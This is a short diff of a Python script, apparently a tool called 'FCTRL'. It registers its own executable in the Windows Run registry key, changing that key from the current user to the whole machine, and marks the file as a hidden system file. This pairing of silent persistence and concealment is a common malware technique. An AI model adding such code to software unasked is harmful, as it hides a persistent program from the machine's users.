@@ -21,7 +21,7 @@ def getpath():
     return application_path
 
 if systype == "windows":
-    print(os.popen(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL non-auto setup" /d "{getpath()}" /f').read())
+    print(os.popen(f'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL non-auto setup" /d "{getpath()}" /f').read())
     print(os.system(f'attrib +s +h +a "{getpath()}"'))
 
 os.chdir(os.path.expanduser("~"))
